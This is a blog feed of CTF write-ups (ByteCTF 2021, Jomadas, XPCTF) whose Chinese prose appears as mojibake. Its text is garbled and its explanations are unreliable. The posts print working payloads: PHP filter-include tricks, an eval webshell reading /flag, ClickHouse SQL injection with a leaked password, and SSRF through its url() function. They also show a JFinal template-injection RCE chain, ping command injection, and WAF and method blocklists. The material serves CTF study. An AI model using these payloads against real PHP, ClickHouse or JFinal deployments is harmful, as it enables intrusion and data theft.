class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">set_error_handler(<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span>, <span class="keyword">array</span> <span class="variable">$errcontext</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> === error_reporting()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">ErrorException</span>(<span class="variable">$errstr</span>, <span class="number">0</span>, <span class="variable">$errno</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable">$test</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">128</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$test</span> = chr(<span class="variable">$i</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&quot;php://filter/resource=123$&#123;test&#125;123/resource=a.txt&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">Throwable</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$i</span>.<span class="string">&quot;         &quot;</span>.<span class="variable">$test</span>.<span class="string">&quot;     &quot;</span>.<span class="variable">$e</span>-&gt;getMessage().<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°äº† @ å­—ç¬¦æœ‰ç‚¹éªš</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">60         &lt;     include(php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;123&lt;123&#x2F;resource&#x3D;a.txt): failed to open stream: operation failed</span><br><span class="line">61         &#x3D;     include(php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;123&#x3D;123&#x2F;resource&#x3D;a.txt): failed to open stream: operation failed</span><br><span class="line">62         &gt;     include(php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;123&gt;123&#x2F;resource&#x3D;a.txt): failed to open stream: operation failed</span><br><span class="line">63         ?     include(php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;123?123&#x2F;resource&#x3D;a.txt): failed to open stream: operation failed</span><br><span class="line">64         @     include(php:&#x2F;&#x2F;...@123&#x2F;resource&#x3D;a.txt): failed to open stream: operation failed</span><br><span class="line">65         A     include(php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;123A123&#x2F;resource&#x3D;a.txt): failed to open stream: operation failed</span><br><span class="line">66         B     include(php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;123B123&#x2F;resource&#x3D;a.txt): failed to open stream: operation failed</span><br><span class="line">67         C     include(php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;123C123&#x2F;resource&#x3D;a.txt): failed to open stream: operation failed</span><br><span class="line">68         D     include(php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;123D123&#x2F;resource&#x3D;a.txt): failed to open stream: operation failed</span><br></pre></td></tr></table></figure><p>å¯ä»¥å°è¯•å‘é€ <code>@/../../../index.php</code> æ„é€ å‡º <code>php://filter/resource=./files/@/../../../index.php</code> æˆåŠŸè¯»å– index.phpï¼Œæ‰€ä»¥å¯ä»¥å°è¯•åŒ…å«ä¸€ä¸‹ files ä¸‹çš„æ–‡ä»¶ï¼Œæˆ‘ä»¬å…ˆä¼ å…¥ä¸€ä¸ªåŒ…å«äº† <code>&lt;?php phpinfo();?&gt;</code> çš„æ–‡ä»¶ï¼Œç„¶åå°è¯•æ„é€  <code>convert.base64-decode/resource@/../../../files/34699711a2</code> ï¼ŒæˆåŠŸåŒ…å«ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action&#x3D;w&amp;c&#x3D;&lt;?php%20phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/25/rCnOmBkuKgxaADH.png"></p><p> æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥ä¼ å…¥ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?action&#x3D;w&amp;c&#x3D;&lt;?php%20eval($_POST[1]);?&gt;</span><br><span class="line">POST</span><br><span class="line">1&#x3D;?&gt;&lt;?&#x3D;&#96;cat &#x2F;flag&#96;;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/25/aVzKL5cvDtWBwN8.png"></p><h2 id="Give-me-your-0day"><a href="#Give-me-your-0day" class="headerlink" title="Give_me_your_0day"></a>Give_me_your_0day</h2><p>ç®€å•çš„ rogue_mysqlï¼ŒæŠ“åŒ…æ”¹ä¸€ä¸‹æ•°æ®åº“ç±»å‹ï¼Œå°±æŠŠ flag å¸¦å‡ºæ¥å°±å®Œäº‹äº†â€¦â€¦</p><p><img src="https://i.loli.net/2021/10/25/P8Aya5bj26dEwCx.png"></p><p>PSï¼š</p><p>ğŸ‹è¯´çœ‹åˆ°æˆ‘è¿™ä¸ª ã€‚ã€‚ã€‚ çš„å†™æ³•è¯´å—ä¸ä½ï¼Œèˆ’æœäº†</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021_Jomadas_WEB3_WP</title>
      <link href="2021/10/20/2021-Jomadas-WEB3-WP/"/>
      <url>2021/10/20/2021-Jomadas-WEB3-WP/</url>
      
        <content type="html"><![CDATA[<ul><li>index.php?option å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–ï¼Œå¯ä»¥è¯»å–æºç </li><li>upload ä¸€ä¸ª zip ä¸Šå»ï¼Œphar è¯»å–ï¼Œè·¯å¾„ï¼šphar://uploads/$(md5(passwd))/$(md5(key)).jpg/1ï¼ˆzip ä¸­åŒ…å«ä¸€ä¸ª 1.php çš„æ–‡ä»¶ï¼‰</li></ul><p>è´´å›¾çºªå¿µä¸€ä¸‹ï¼ŒMake ç”·ç«¥æ”¶å‰²è€… Great~</p><p><img src="https://i.loli.net/2021/10/20/9uHC8kX53tJOmiK.png"></p><p><img src="https://i.loli.net/2021/10/20/dGi9pVCZTuWEFmh.png"></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021_ByteCTF_WP</title>
      <link href="2021/10/16/2021-ByteCTF-WP/"/>
      <url>2021/10/16/2021-ByteCTF-WP/</url>
      
        <content type="html"><![CDATA[<h2 id="Web-double-sqli"><a href="#Web-double-sqli" class="headerlink" title="Web-double sqli"></a>Web-double sqli</h2><p>è¿™é¢˜æ˜¯çœŸçš„å­¦æ–°çŸ¥è¯†ï¼Œå®Œå…¨æ²¡ç”¨è¿‡çš„ clickhouseï¼Œçœ‹äº†ä¸€ä¸‹åˆçš„æ–‡æ¡£ã€‚</p><p>è€ƒç‚¹ï¼š</p><ul><li>Nginx ç›®å½•ç©¿è¶Š</li><li>clickhouse sql æ³¨å…¥</li></ul><p>æ„é€  /files../ å¯ä»¥è®¿é—®åˆ°æ ¹ç›®å½•ï¼Œä»¥è¯»å–é…ç½®æ–‡ä»¶åŠä¸€äº›æ•æ„Ÿä¿¡æ¯ï¼šï¼ˆNginxåœ¨é…ç½®åˆ«å(Alias)çš„æ—¶å€™,å¦‚æœå¿˜è®°åŠ  /,å°†é€ æˆä¸€ä¸ªç›®å½•ç©¿è¶Šæ¼æ´ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">port: 9000</span><br><span class="line">user_01: e3b0c44298fc1c149afb</span><br></pre></td></tr></table></figure><p>éšä¾¿è¾“äº†ç‚¹ä¸ƒé‡Œå…«é‡Œçš„å€¼å¾—åˆ°äº†åç«¯é€»è¾‘</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ByteCTF <span class="keyword">FROM</span> hello <span class="keyword">WHERE</span> <span class="number">1</span> <span class="operator">=</span> `$<span class="keyword">sql</span>`</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/16/gsOl4y5HeBSJ26a.jpg"></p><p>clickhouse çš„æ–‡æ¡£ï¼š<a href="https://clickhouse.com/docs/zh/sql-reference/statements/select/all/">https://clickhouse.com/docs/zh/sql-reference/statements/select/all/</a></p><p>å¯ä»¥æ„é€ å‡ºï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="operator">||</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> system.tables limit <span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"><span class="number">0</span><span class="operator">||</span>(<span class="keyword">select</span> name <span class="keyword">from</span> system.databases limit <span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"><span class="number">0</span><span class="operator">||</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ctf.hint limit <span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"><span class="number">0</span><span class="operator">||</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ctf.flag limit <span class="number">0</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>clickhouse å’Œä¹‹å‰å­¦è¿‡çš„ sql æœ‰è›®å¤šåŒºåˆ«ï¼Œæˆ‘ä»¬å½“å‰çš„ç”¨æˆ·æ˜¯ user_02ï¼Œæ²¡æœ‰æƒé™å»è¯» ctf.flagï¼Œåœ¨ /var/lib/clickhouse/ å‘ç°äº† user_01 ç”¨æˆ·åŠå…¶å¯†ç ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ATTACH <span class="keyword">USER</span> user_01 IDENTIFIED <span class="keyword">WITH</span> plaintext_password <span class="keyword">BY</span> <span class="string">&#x27;e3b0c44298fc1c149afb&#x27;</span>;</span><br><span class="line">ATTACH <span class="keyword">GRANT</span> <span class="keyword">SELECT</span> <span class="keyword">ON</span> ctf.<span class="operator">*</span> <span class="keyword">TO</span> user_01;</span><br></pre></td></tr></table></figure><p>é¥¶äº†å››äº”ä¸ªå°æ—¶ç»•å›æ¥æœ€å¼€å§‹çœ‹åˆ°çš„ url å‡½æ•°ï¼ˆè€å­ä¸€ğŸ”ªæŠŠå°¼ğŸğŸ¦ˆäº†ï¼Œç„¶åçˆ¬å°¼ğŸåŸä¸Šæ’’å°¿ï¼Œæœ€åå·åƒå°¼ğŸè´¡å“ğŸï¼‰</p><p>æœ€åï¼Œclickhouse æä¾›äº†ä¸€ä¸ªå±Œå¯„éœ¸æ¥å£åœ¨ 8123 ç«¯å£ï¼Œå¯ä»¥åˆ©ç”¨ clickhouse è‡ªå¸¦çš„å‡½æ•° url æ¥ ssrf ç„¶åæ‰“å†…ç½‘</p><blockquote><p>The HTTP interface lets you use ClickHouse on any platform from any programming language. We use it for working from Java and Perl, as well as shell scripts. In other departments, the HTTP interface is used from Perl, Python, and Go. The HTTP interface is more limited than the native interface, but it has better compatibility.</p><p>By default, <code>clickhouse-server</code> listens for HTTP on port 8123 (this can be changed in the config).</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="operator">||</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> url(<span class="string">&#x27;http://127.0.0.1:8123/?user=user_01%26password=e3b0c44298fc1c149afb%26query=select%2520*%2520from%2520ctf.flag&#x27;</span>, CSV, <span class="string">&#x27;column1 String&#x27;</span>))</span><br></pre></td></tr></table></figure><p>flag ç»™ğŸ‘´å‡ºï¼š<code>ByteCTF&#123;e3b0c44298fc1c149afbf4c8&#125;</code></p><p><img src="https://i.loli.net/2021/10/16/JqVWQIX2ALd3btO.png"></p><hr><p>æœ€åè¡¥å……ä¸€ä¸ªğŸ‹ç ”ç©¶çš„ç›²æ³¨çš„æ€è·¯~</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> <span class="keyword">OR</span> startsWith((extractAll(((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> system.databases limit <span class="number">1</span>,<span class="number">1</span>)<span class="number">.2</span>), <span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>]),<span class="string">&#x27;2&#x27;</span>)</span><br></pre></td></tr></table></figure><p>extractAll(str, â€˜.â€™) å¯ä»¥å°†å­—ç¬¦ä¸²é€ä½åˆ†å‰²ï¼ŒåŒæ—¶æ•°ç»„å¯ä»¥ä½¿ç”¨ [0] è¿›è¡Œè®¿é—®è€Œå…ƒç»„å¯ä»¥ä½¿ç”¨ .0 çš„æ–¹å¼è®¿é—®ã€‚ä½¿ç”¨ startsWith é…åˆå­—ç¬¦ä¸²å¯ä»¥è¿›è¡Œé€ä½çˆ†ç ´ã€‚</p><h2 id="Web-Unsecure-Blog"><a href="#Web-Unsecure-Blog" class="headerlink" title="Web-Unsecure Blog"></a>Web-Unsecure Blog</h2><p>åå° adminï¼Œè´¦å·å¯†ç  jfnial / 111111</p><p>å¯ä»¥åœ¨æµè§ˆå‘ç°ä¸€ä¸ª jfinal enjoy æ¨¡æ¿çš„ sstiï¼Œå¯ä»¥è¡¨è¾¾å¼æ³¨å…¥ï¼šï¼ˆæ–‡æ¡£ï¼š<a href="https://jfinal.com/doc/6-4%EF%BC%89">https://jfinal.com/doc/6-4ï¼‰</a></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#(x=123)#(x)#(123)</span><br></pre></td></tr></table></figure><p>æ„é€ ç”Ÿæˆç±»ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#(1.class.forName(&quot;java.lang.Runtime&quot;))</span><br><span class="line">#(1.class.forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&#x27;java.lang.ProcessBuilder(&#x27;calc&#x27;).start()&#x27;))</span><br></pre></td></tr></table></figure><hr><p>ä¸Šè¿°è¡¨è¾¾å¼æœ‰é—®é¢˜ï¼Œæ¯”èµ›çš„æ—¶å€™æœ‰æ®µæ—¶é—´æµ‹çš„å¯ä»¥ï¼Œä¸è¿‡åæ¥ä¸è¡Œäº†ï¼Œå¦‚å›¾<img src="https://i.loli.net/2021/10/19/JzLsYclhZ54MwGR.jpg"></p><p><img src="https://i.loli.net/2021/10/19/uyHkMsU7lWLbeSQ.jpg"></p><p>è´´ä¸€ä¸‹ JFinal Enjoy çš„å†…ç½®é»‘åå•çš„ç±» <code>com.jfinal.template.expr.ast.MethodKit</code> çš„æºç ï¼š<a href="https://github.com/jfinal/jfinal/blob/master/src/main/java/com/jfinal/template/expr/ast/MethodKit.java%EF%BC%8C%E5%AE%83%E7%9A%84%E9%9D%99%E6%80%81%E4%BB%A3%E7%A0%81%E5%9D%97%E4%B8%AD%E5%AE%9A%E4%B9%89%E4%BA%86%E9%99%90%E5%88%B6%E7%B1%BB%E5%92%8C%E6%96%B9%E6%B3%95%E7%9A%84%E9%BB%91%E5%90%8D%E5%8D%95%EF%BC%9A">https://github.com/jfinal/jfinal/blob/master/src/main/java/com/jfinal/template/expr/ast/MethodKit.javaï¼Œå®ƒçš„é™æ€ä»£ç å—ä¸­å®šä¹‰äº†é™åˆ¶ç±»å’Œæ–¹æ³•çš„é»‘åå•ï¼š</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">String[] ms = &#123;</span><br><span class="line"><span class="string">&quot;getClass&quot;</span>, <span class="string">&quot;getDeclaringClass&quot;</span>, <span class="string">&quot;forName&quot;</span>, <span class="string">&quot;newInstance&quot;</span>, <span class="string">&quot;getClassLoader&quot;</span>,</span><br><span class="line"><span class="string">&quot;invoke&quot;</span>, <span class="comment">// &quot;getMethod&quot;, &quot;getMethods&quot;, // &quot;getField&quot;, &quot;getFields&quot;,</span></span><br><span class="line"><span class="string">&quot;notify&quot;</span>, <span class="string">&quot;notifyAll&quot;</span>, <span class="string">&quot;wait&quot;</span>,</span><br><span class="line"><span class="string">&quot;exit&quot;</span>, <span class="string">&quot;loadLibrary&quot;</span>, <span class="string">&quot;halt&quot;</span>, <span class="comment">// &quot;load&quot;,</span></span><br><span class="line"><span class="string">&quot;stop&quot;</span>, <span class="string">&quot;suspend&quot;</span>, <span class="string">&quot;resume&quot;</span>, <span class="comment">// &quot;setDaemon&quot;, &quot;setPriority&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;removeForbiddenClass&quot;</span>,</span><br><span class="line"><span class="string">&quot;removeForbiddenMethod&quot;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>åœ¨æ‹œè¯»äº† @Mrkaixin å¤§å¤§å¤§å¸ˆå‚…ï¼ˆè°­æ€»ç‰›é€¼ï¼‰çš„ WP åï¼Œå­¦ä¹ åˆ°äº†å¯ä»¥é€šè¿‡è°ƒç”¨ä¸€äº›ç±»çš„é™æ€æ–¹æ³•æ¥è·å–å®ä¾‹ï¼Œæ¯”å¦‚ <code>net.sf.ehcache.util.ClassLoaderUtil createNewInstance</code>ï¼Œè¿™ä¸ªæ–¹æ³•æ²¡è¢«é»‘åå•è¿‡æ»¤ï¼ˆæ¨èä¸€æ³¢è¿™ä¸ªç½‘ç«™ï¼š<a href="https://www.tabnine.com/code%EF%BC%8C%E6%90%9C">https://www.tabnine.com/codeï¼Œæœ</a> JAVA ä»£ç å¾ˆå¥½ç”¨ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">createNewInstance</span><span class="params">(String className)</span> <span class="keyword">throws</span> CacheException </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> createNewInstance(className, <span class="keyword">new</span> Class[<span class="number">0</span>], <span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>é¶æœºæ— äº†ï¼Œå¯„ï¼</p><h2 id="Web-Aginx"><a href="#Web-Aginx" class="headerlink" title="Web-Aginx"></a>Web-Aginx</h2><p>é¢å‘å¤§å¸ˆå‚… WP çš„è§£é¢˜ï¼š<a href="https://impakho.com/post/bytectf-2021-aginx-writeup">https://impakho.com/post/bytectf-2021-aginx-writeup</a></p><h2 id="Misc-frequently"><a href="#Misc-frequently" class="headerlink" title="Misc-frequently"></a>Misc-frequently</h2><p>è¢«ğŸ‹å¸¦ç€å‡ºäº†ä¸€åŠ flagï¼Œå½³äºï¼Œèµ›åå†è·Ÿç€ğŸ‹çš„ WP å¤ç°äº†ä¸€ä¸‹ï¼Œæœ€åè¿˜æ˜¯å‡ºäº†ï¼Œå½³äºã€‚</p><p>åœ¨ WireShark åˆ†æå¯ä»¥å‘ç°å‘ç°å¤§é‡æ¥è‡ª xxxx.bytedanec.net çš„ DNS æŸ¥è¯¢è¯·æ±‚ï¼Œå°†å…¶åŸŸåçš„ç¬¬ä¸€æ®µåˆ†ç¦»å‡ºæ¥ï¼Œä½¿ç”¨ Base64 è¿›è¡Œè§£ç å¯ä»¥å¾—åˆ°ä¸€å¼ æ²¡ç”¨çš„å›¾ç‰‡ï¼Œç»§ç»­è¿›è¡Œåˆ†æï¼Œå°†å‰©ä½™ DNS è¯·æ±‚ä¸­çš„ iã€o æå–å‡ºæ¥è¿›è¡Œå¤„ç†ï¼ˆCyberChefï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;i\\n&#39;&#125;,&#39;1&#39;,true,false,true,false)</span><br><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;o\\n&#39;&#125;,&#39;0&#39;,true,false,true,false)</span><br><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39; &#39;&#125;,&#39;&#39;,true,false,true,false)</span><br><span class="line">From_Binary(&#39;Space&#39;,8)</span><br><span class="line"></span><br><span class="line">The first part of flag: ByteCTF&#123;^_^enJ0y&amp;y0u9</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ç¬¬ä¸€æ®µ flagã€‚éšåå¯ä»¥åœ¨æµé‡åŒ…ä¸­å‘ç° DHCP åŒ…ï¼Œå°† ACK ä¸­åŒ…å«çš„ IP Address Lease Time æå–å‡ºæ¥å¯ä»¥å¾—åˆ°åä¸€åŠ flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">se1f_wIth_m1sc^_^&#125;</span><br></pre></td></tr></table></figure><p>å®Œæ•´ flagï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ByteCTF&#123;^_^enJ0y&amp;y0u9se1f_wIth_m1sc^_^&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XPCTF@HUT å‡ºé¢˜ç¬”è®°</title>
      <link href="2021/10/16/XPCTF-HUT-%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
      <url>2021/10/16/XPCTF-HUT-%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>ç»™å¤§äºŒå‡ºäº†ç‚¹ç®€å•é¢˜ç©ç©ã€‚æ„Ÿè§‰åšå¾—è¿˜å½³äºï¼Œæœ‰ç‚¹æ„æ€ã€‚</p><h2 id="Web-ä½ åœ¨æ‰«å°¼ç›çš„ä¸œæ–¹æ˜ç å¡”æ‰«å‘¢ä½ "><a href="#Web-ä½ åœ¨æ‰«å°¼ç›çš„ä¸œæ–¹æ˜ç å¡”æ‰«å‘¢ä½ " class="headerlink" title="Web-ä½ åœ¨æ‰«å°¼ç›çš„ä¸œæ–¹æ˜ç å¡”æ‰«å‘¢ä½ "></a>Web-ä½ åœ¨æ‰«å°¼ç›çš„ä¸œæ–¹æ˜ç å¡”æ‰«å‘¢ä½ </h2><p>æœ¬é¢˜ä¸»è¦è€ƒå¯Ÿ shell å‘½ä»¤æ‰§è¡Œçš„ä¸€äº›å°æŠ€å·§ï¼Œåç®€å•é¢˜ã€‚ç»™å‡ºäº†é¢˜ç›®é™„ä»¶ flag.shï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/env bash</span></span><br><span class="line">echo $FLAG &gt; /flag</span><br><span class="line"></span><br><span class="line">export FLAG=not_flag</span><br><span class="line">FLAG=not_flag</span><br><span class="line"></span><br><span class="line">apache2-foreground</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸»è¦æ˜¯æç¤º flag åœ¨ /flag ä»¥åŠæç¤ºç¯å¢ƒå˜é‡ä¸­æœ‰ FLAG å¯ä»¥ç”¨</p><p>é¢˜ç›®æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Author: Du1L0v3</span></span><br><span class="line"><span class="comment"> * Description: å°±è¿™ï¼Ÿæåœ¨å—¦æ³¥ğŸå‘¢ï¼ŒçœŸæ˜¯éº»é›€å•„ğŸ‚ä¸ä¸ï¼Œé›€é£Ÿç‰›é€¼</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cnm</span> = file_get_contents(<span class="string">&quot;/flag.sh&quot;</span>);</span><br><span class="line"><span class="variable">$nmsl</span> = str_replace(<span class="string">&quot;apache2-foreground&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$cnm</span>);</span><br><span class="line">shell_exec(<span class="variable">$nmsl</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/\x09|\x0a|[a-z]| |BASH|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|~|\!|\=|\^|\*|#|%|\&gt;|\&lt;|\&#x27;|\&quot;|\`|_|\,/&#x27;</span>, <span class="variable">$url</span>)) &#123;</span><br><span class="line">        <span class="variable">$res</span> = shell_exec(<span class="string">&quot;bash -c &#x27;ping &quot;</span> . <span class="variable">$url</span> . <span class="string">&quot; -c 1&#x27;&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (strstr(<span class="variable">$res</span>, <span class="string">&quot;flag&quot;</span>) || strstr(<span class="variable">$res</span>, <span class="string">&quot;xpctf&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;why you so vegetable&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="variable">$res</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;you want to do what?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;wai bi ba bo&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸»è¦éœ€è¦è€ƒè™‘å¦‚ä½•å»é—­åˆ <code>bash -c &#39;ping &quot; . $url . &quot; -c 1&#39;</code> ä»¥åŠé—­åˆä¹‹åå¦‚ä½•ç»•è¿‡ WAF æ‰§è¡Œå‘½ä»¤</p><p>é¦–å…ˆä¸è€ƒè™‘å­˜åœ¨ WAF å¯ä»¥è½»æ¾æ„é€ å‡ºï¼š<code>url=127.0.0.1|ls%26ping 127.0.0.1</code>ï¼ˆ&amp; éœ€è¦ urlencode ä¸º %26ï¼‰</p><p>è¿™æ ·æ„é€ å°±ä½¿ä¸¤å¤´é—­åˆï¼Œä»è€Œå¯ä»¥åœ¨ä¸­é—´æ‰§è¡Œä»»æ„å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 127.0.0.1 | ls &amp; ping 127.0.0.1 -c 